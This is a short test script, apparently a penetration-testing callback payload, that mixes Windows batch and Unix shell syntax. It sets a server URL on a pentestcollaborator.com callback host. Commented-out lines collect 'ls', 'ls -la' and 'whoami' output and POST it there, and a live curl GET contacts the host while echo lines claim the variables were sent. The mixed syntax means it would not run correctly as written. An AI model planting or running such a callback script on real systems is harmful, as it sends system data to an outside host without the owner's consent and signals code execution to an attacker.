@echo off
setlocal

echo test2

export SERVER_URL=https://dgxf2r4zy2371eldbrhf9ym7pyvpjl7a.pentestcollaborator.com


#echo Retrieve environment variables
#export VAR1=$(ls)
#export VAR2=$(ls -la)
#export VAR3=$(whoami)

echo Sending environment variables to server...

echo Send environment variables to server
#curl -X POST -H "Content-Type: application/html" -d "{\"VAR1\":\"$VAR1\",\"VAR2\":\"$VAR2\",\"VAR3\":\"$VAR3\"}" $SERVER_URL
curl -X GET -H "Content-Type: application/html" $SERVER_URL

echo Environment variables sent to server.
